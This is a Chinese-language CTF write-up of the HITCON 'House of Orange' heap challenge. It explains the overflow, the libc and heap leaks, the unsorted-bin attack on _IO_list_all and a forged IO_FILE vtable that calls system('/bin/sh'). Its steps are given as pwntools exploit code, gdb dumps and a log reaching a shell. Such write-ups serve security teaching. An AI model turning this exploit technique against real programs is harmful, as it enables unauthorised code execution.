题目链接：https://github.com/giantbranch/CTF_PWN/tree/master/other/houseoforange 讲解题目这是一个HITCON中的经典题目了，通过对buildhouse函数的逆向可以得到下面两个结构体 123456789struct house&#123; struct orange* point; qword* name;&#125;struct orange&#123; dword price dword color;&#125; 所以在ida新建结构体，当然这题好像没啥太大的帮助 12345678910111213141500000000 orange struc ; (sizeof=0x8, mappedto_6)00000000 ; XREF: house/r00000000 price dd ?00000004 color dd ?00000008 orange ends0000000800000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]00000000 ; ---------------------------------------------------------------------------0000000000000000 house struc ; (sizeof=0x10, mappedto_7)00000000 orangePoint orange ?00000008 name dq ?00000010 house ends0000001000000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND] 保护是全开的 123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled 总体思路： 1、通过upgrade的溢出覆盖topchunk size，那么我们再build，原来的topchunk就到unsortbin去了，就有了libc指针 注意：topchunk size的覆盖是有限制的，最低位要是1，跟topchunk的其实地址加起来要跟0x1000对齐，还有要大于MINSIZE （好像是0x10） 12345######### overwrite top chunk sizebuild(0x10, &quot;A&quot;*0x10, 10, 1)upgrade(0x40, &quot;A&quot;*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)# let top chunk to unsort bin listbuild(0xfb0, &quot;A&quot;*0x10, 10, 1) 2、接下来我们申请一个largebin大小的（因为有fd_nextsize和bk_nextsize，可以泄露heap的地址），我们只覆盖前8个字节就可以leak出libc了 注：64位下，largebin最小大小是0x400，即1024字节，要申请largebin大小，必须大于等于0x3e9 12345678910111213141516######### leak libc# in 64 bit, must malloc more than 0x3e9 to get large binbuild(0x400, &quot;A&quot;*8, 10, 1)# build(0x3e9, &quot;A&quot;*8, 10, 1)see()p.recvuntil(&quot;Name of house : AAAAAAAA&quot;)largebin_leak = u64(p.recvuntil(&quot;
&quot;)[:-1].ljust(8, &quot;\x00&quot;))print &quot;largebin_leak = &quot; + hex(largebin_leak)main_arena = largebin_leak - 1640print &quot;main_arena = &quot; + hex(main_arena)libc_base = main_arena - main_arena_offsetprint &quot;libc_base = &quot; + hex(libc_base)system = libc_base + libc.symbols[&apos;system&apos;]_IO_list_all = libc_base + libc.symbols[&apos;_IO_list_all&apos;]print &quot;system = &quot; + hex(system)print &quot;_IO_list_all = &quot; + hex(_IO_list_all) 3、之后再覆盖0x10大小，泄露heap地址 123456# leak heapupgrade(0x20, &quot;A&quot;*0x10, 10 , 1)see()p.recvuntil(&quot;Name of house : AAAAAAAAAAAAAAAA&quot;)heap_addr = u64(p.recvuntil(&quot;
&quot;)[:-1].ljust(8, &quot;\x00&quot;))print &quot;heap_addr = &quot; + hex(heap_addr) 4、最后就利用溢出覆盖unsortbin的bk，实行unsortbin attack，将_IO_list_all指针指向了main_arena+0x58，那么链表指针_chain指向了smallbin[4]，即第5个smallbin——0x60大小的。而我们之前就将unsortbin的size改为0x61，所以我们再申请的时候，他首先就会放到smallbin[4],最后我们伪造vtable即可 查看unsortbin位置，可以看到确实chain指向 1234567891011121314151617181920212223242526272829303132333435gdb-peda$ p *((struct _IO_FILE_plus*)0x7f742fb8db78)$13 = &#123; file = &#123; _flags = 0xf12befc0, _IO_read_ptr = 0x559af129d4f0 &quot;&quot;, _IO_read_end = 0x559af129d4f0 &quot;&quot;, _IO_read_base = 0x7f742fb8e510 &quot;&quot;, _IO_write_base = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, _IO_write_ptr = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\360\324)\361\232U&quot;, _IO_write_end = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, _IO_buf_base = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\210?/t\177&quot;, _IO_buf_end = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, _IO_save_base = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\230?/t\177&quot;, _IO_backup_base = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, _IO_save_end = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\250?/t\177&quot;, _markers = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, _chain = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, _fileno = 0x2fb8dbd8, _flags2 = 0x7f74, _old_offset = 0x7f742fb8dbd8, _cur_column = 0xdbe8, _vtable_offset = 0xb8, _shortbuf = &quot;/&quot;, _lock = 0x7f742fb8dbe8 &lt;main_arena+200&gt;, _offset = 0x7f742fb8dbf8, _codecvt = 0x7f742fb8dbf8 &lt;main_arena+216&gt;, _wide_data = 0x7f742fb8dc08 &lt;main_arena+232&gt;, _freeres_list = 0x7f742fb8dc08 &lt;main_arena+232&gt;, _freeres_buf = 0x7f742fb8dc18 &lt;main_arena+248&gt;, __pad5 = 0x7f742fb8dc18, _mode = 0x2fb8dc28, _unused2 = &quot;t\177\000\000(?/t\177\000\000\070?/t&quot;... &#125;, vtable = 0x7f742fb8dc38 &lt;main_arena+280&gt;&#125; 那么整个过程怎么触发的呢？ 我们修改了bk后，那当我们再次申请内存的时候，其他bins都没有可用的，而unsortbin有可用的内存，就会遍历unsortbin列表，不合适就将bin拖链放到对应的bins列表，比如0x60大小的就放到smallbin那里了，这时候就通过unsortbin attack修改了_IO_list_all，即下面代码的bck-&gt;fd = unsorted_chunks (av);，将unsortbin的头指针写到了bck的fd，即我们要写到(_IO_list_all-0x10)-&gt;fd，也即写到_IO_list_all（注：av的类型是malloc_state，即mstate，他指向main_arena），再次遍历下一个时由于size为0即_IO_list_all-8处为0，触发的异常，从而劫持控制力，详细请看附录 1234567891011121314151617while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr (&quot;malloc(): memory corruption&quot;); size = chunksize (victim); ............. ............. ............. /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); ............. ............. ............. 还有我们伪造的IO_FILE需要满足一些条件，才能调用_IO_OVERFLOW 12345678 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 那么_IO_OVERFLOW指针覆盖为system，fp头指针我们设置为/bin/sh 最终即可成功getshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[+] Starting local process &apos;./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&apos;: pid 6012[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabledlargebin_leak = 0x7fbfa9142188main_arena = 0x7fbfa9141b20libc_base = 0x7fbfa8d7d000system = 0x7fbfa8dc2390_IO_list_all = 0x7fbfa9142520heap_addr = 0x55dab4acf0c00x520[*] Switching to interactive mode*** Error in `./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&apos;: malloc(): memory corruption: 0x00007fbfa9142520 ***======= Backt